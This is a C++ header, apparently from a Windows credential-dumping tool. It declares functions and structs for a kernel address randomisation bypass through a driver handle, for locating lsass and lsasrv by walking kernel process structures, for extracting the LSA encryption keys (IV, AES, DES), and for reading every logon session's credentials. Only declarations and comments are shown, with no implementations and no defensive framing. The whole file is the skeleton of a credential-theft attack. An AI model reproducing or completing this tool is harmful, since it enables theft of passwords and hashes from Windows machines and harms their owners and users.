#pragma once
#include "memory.h"
// ----------------------------------------------------------------
// SubCmd 2 results: KASLR bypass + CPU register info
// ----------------------------------------------------------------
struct SubCmd2Info {
    uint64_t ntos_base;  // ntoskrnl base (IDTR -> IDT -> ISR -> MZ scan)
    uint64_t kpcr;       // gsbase = KPCR
    uint64_t cr3;        // current process DTB
};

SubCmd2Info kaslr_bypass(HANDLE h);

// ----------------------------------------------------------------
// Lsass location info
// ----------------------------------------------------------------
struct LsassInfo {
    uint64_t eprocess;
    uint64_t dtb;
    uint32_t peb_offset;
};

// Find lsass via NtQuerySystemInformation(SystemExtendedHandleInformation)
// to leak our EPROCESS from the kernel handle table, then walk ActiveProcessLinks.
LsassInfo find_lsass(HANDLE driver_handle);

// ----------------------------------------------------------------
// Module info
// ----------------------------------------------------------------
struct ModuleInfo {
    uint64_t base;
    uint32_t size;
};

ModuleInfo find_lsasrv(HANDLE h, uint64_t dtb, uint64_t ep, uint32_t peb_off);

// ----------------------------------------------------------------
// LSA encryption keys
// ----------------------------------------------------------------
struct LsaKeys {
    Bytes iv;
    Bytes aes_key;
    Bytes des_key;
};

LsaKeys extract_lsa_keys(HANDLE h, uint64_t dtb, uint64_t base, uint32_t size);

// ----------------------------------------------------------------
// Logon session list
// ----------------------------------------------------------------
struct LogonListInfo {
    uint64_t list_ptr;
    uint32_t count;
};

LogonListInfo find_logon_list(HANDLE h, uint64_t dtb, uint64_t base, uint32_t size, uint32_t build);

// ----------------------------------------------------------------
// Extract all credentials
// ----------------------------------------------------------------
std::vector<Credential> extract_creds(HANDLE h, uint64_t dtb,
                                      uint64_t list_ptr, uint32_t count,
                                      uint32_t build,
                                      const LsaKeys& keys);
